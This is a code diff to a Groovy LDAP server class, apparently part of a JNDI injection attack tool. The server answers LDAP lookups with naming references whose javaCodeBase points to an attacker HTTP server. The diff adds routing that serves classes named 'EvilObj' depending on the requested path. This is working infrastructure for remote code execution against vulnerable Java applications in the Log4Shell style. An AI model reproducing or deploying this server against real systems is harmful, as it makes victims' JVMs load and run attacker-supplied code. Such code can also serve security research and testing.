@@ -1,5 +1,6 @@
 package com.jndi.server
 
+
 import com.jndi.server.impl.JNDIServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
@@ -10,6 +11,7 @@ import com.unboundid.ldap.sdk.Entry
 import com.unboundid.ldap.sdk.LDAPResult
 import com.unboundid.ldap.sdk.ResultCode
 import groovy.util.logging.Slf4j
+import org.springframework.beans.factory.annotation.Autowired
 import org.springframework.beans.factory.annotation.Value
 
 import javax.net.ServerSocketFactory
@@ -50,10 +52,27 @@ class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
     @Override
     void processSearchResult(InMemoryInterceptedSearchResult result){
         def base = result.getRequest().getBaseDN()
+        def index = base.indexOf('#')
+        def path = ''
+        if (index != -1){
+            path = base.substring(0, index)
+        } else {
+            path = base
+        }
         def e = new Entry(base)
         def url = "http://${ip}:${httpPort}/"
-        def className = 'com.jndi.template.EvilObj'
-//        def className = 'com.jndi.entity.EvilObj'
+        def className
+        switch (path){
+            case 'evil':
+                className = 'com.jndi.template.EvilObj'
+                break
+            case 'base':
+                className = 'com.jndi.entity.EvilObj'
+                break
+            default:
+                className = 'com.jndi.template.NullObj'
+                break
+        }
         e.addAttribute('javaClassName', 'evilObj')
         e.addAttribute('javaCodeBase', url)
         e.addAttribute('objectClass', 'javaNamingReference')
